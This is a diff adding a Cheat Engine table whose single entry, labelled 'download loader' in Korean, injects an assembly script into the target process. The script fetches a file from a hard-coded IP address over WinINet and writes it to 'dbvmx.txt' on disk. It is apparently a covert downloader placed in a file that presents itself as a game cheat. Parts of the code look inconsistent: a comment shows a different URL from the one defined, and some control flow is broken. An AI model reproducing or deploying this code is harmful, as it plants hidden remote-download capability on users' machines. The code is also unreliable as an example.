@@ -1,0 +1,109 @@
+<?xml version="1.0" encoding="utf-8"?>
+<CheatTable CheatEngineTableVersion="38">
+  <CheatEntries>
+    <CheatEntry>
+      <ID>0</ID>
+      <Description>"다운로드 로더"</Description>
+      <LastState/>
+      <VariableType>Auto Assembler Script</VariableType>
+      <AssemblerScript>[ENABLE]
+//code from here to '[DISABLE]' will be used to enable the cheat
+
+00402000:
+dd 00736574
+00402100:
+db 'http://112.166.11.137/findx/ddd.txt' 00
+
+00402200:
+db 'dbvmx.txt' 00
+
+00401000:
+label(Error1)
+label(Error2)
+push ebp
+mov ebp,esp
+sub esp,00000690 { 1680 }
+push ebx
+push esi
+push edi
+lea edi,[ebp-00000450]
+mov ecx,00000114 { 276 }
+mov eax,CCCCCCCC { -858993460 }
+repe stosd
+mov [ebp-2C],00000001 { 1 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00402000 { (00736574) }
+call WININET.InternetOpenA
+mov [ebp-08],eax
+mov esi,esp
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00 { 0 }
+push 00402100 { ("https://drive.google.com/file/d/1NnIw5RYCJhbP7QTmeBgQslqzbCt5A-") }
+mov eax,[ebp-08]
+push eax
+call WININET.InternetOpenUrlA
+mov [ebp-14],eax
+push 00 { 0 }
+push 00000080 { 128 }
+push 02 { 2 }
+push 00 { 0 }
+push 00 { 0 }
+push 40000000 { 2.00 }
+push 00402200 { (-491986516) }
+call KERNELBASE.CreateFileA
+mov [ebp-0000044C],eax
+cmp dword ptr [ebp-0000044C],-01 { 255 }
+jmp Error1//ErrorProject6.exe+1184D
+Error1:
+mov ebx,[ebp-2c]
+cmp ebx,00 { 0 }
+jna Error2
+lea eax,[ebp-2C]
+push eax
+push 00000400 { 1024 }
+lea ecx,[ebp-00000434]
+push ecx
+mov edx,[ebp-14]
+push edx
+call WININET.InternetReadFile
+push 00 { 0 }
+lea eax,[ebp-00000440]
+push eax
+mov ecx,[ebp-2C]
+push ecx
+lea edx,[ebp-00000434]
+push edx
+mov eax,[ebp-0000044C]
+push eax
+call KERNELBASE.WriteFile
+jmp Error1
+Error2:
+mov eax,[ebp-14]
+push eax
+call WININET.InternetCloseHandle
+mov esi,esp
+mov eax,[ebp-08]
+push eax
+call WININET.InternetCloseHandle
+mov eax,[ebp-0000044C]
+push eax
+call KERNELBASE.CloseHandle
+add ebp,4
+mov esp,ebp
+ret
+
+createThread(00401000)
+
+
+[DISABLE]
+//code from here till the end of the code will be used to disable the cheat
+</AssemblerScript>
+    </CheatEntry>
+  </CheatEntries>
+  <UserdefinedSymbols/>
+</CheatTable>
